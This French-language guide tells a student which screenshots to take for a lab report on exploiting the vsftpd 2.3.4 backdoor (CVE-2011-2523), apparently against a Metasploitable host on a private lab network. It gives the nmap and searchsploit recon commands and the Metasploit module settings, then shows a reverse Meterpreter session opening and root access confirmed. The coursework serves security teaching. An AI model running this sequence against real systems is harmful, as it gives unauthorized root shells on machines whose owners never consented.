# Captures — vsftpd 2.3.4 Backdoor

Consignes de capture pour `services/vsftpd.html`. Commandes identiques à celles du write-up
source : `ms2/jules/vsftpd.md`.

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 21 172.28.128.5
```

Encadrer en rouge : la ligne `21/tcp open ftp vsftpd 2.3.4` — c'est le footprint qui
déclenche toute la démarche, doit être immédiatement visible.

## 02-recherche-module.png

Les deux commandes à la suite, dans le même terminal (capture unique) :
```bash
searchsploit vsftpd 2.3.4
msfconsole -q -x "search vsftpd; exit"
```

Encadrer en rouge : la ligne `exploit/unix/ftp/vsftpd_234_backdoor` dans le résultat de
`search` — c'est de là que vient le chemin exact du module utilisé ensuite.

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/ftp/vsftpd_234_backdoor; exit"
```

Capturer la section `References` (pas besoin du reste de la sortie `info`, assez longue).
Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2011-2523` — c'est la
preuve d'où vient le numéro de CVE cité dans le rapport.

## 04-exploit-config.png

Dans `msfconsole`, tapé **ligne par ligne** (pas de resource script pour cette capture — on
montre la manipulation interactive réelle) :
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.28.128.5
RHOSTS => 172.28.128.5
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
RPORT => 21
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 172.28.128.1
LHOST => 172.28.128.1
```

S'arrêter avant de taper `exploit -z` (capture suivante). Encadrer en rouge : les 3 lignes
`set RHOSTS` / `set RPORT` / `set LHOST` — montre que la cible et le retour sont bien
configurés avant de lancer quoi que ce soit.

## 05-exploit-launch.png

Suite directe du même terminal :
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit -z
[*] Started reverse TCP handler on 172.28.128.1:4444
[*] 172.28.128.5:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 172.28.128.5:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected
[+] 172.28.128.5:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (172.28.128.1:4444 -> 172.28.128.5:xxxxx)
[*] Session 1 created in the background.
```

Encadrer en rouge : la ligne `[+] Backdoor has been spawned!` et la ligne `[*] Meterpreter
session 1 opened (...)` juste en dessous — c'est le moment précis de l'exploitation réussie,
isolé du reste pour que ce soit la première chose que le prof voie.

## 06-session-root.png

Suite du même terminal :
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c id
[*] Running 'id' on meterpreter session 1 (172.28.128.5)
uid=0(root) gid=0(root)
```

Encadrer en rouge : `uid=0(root) gid=0(root)` — la preuve finale d'accès root.
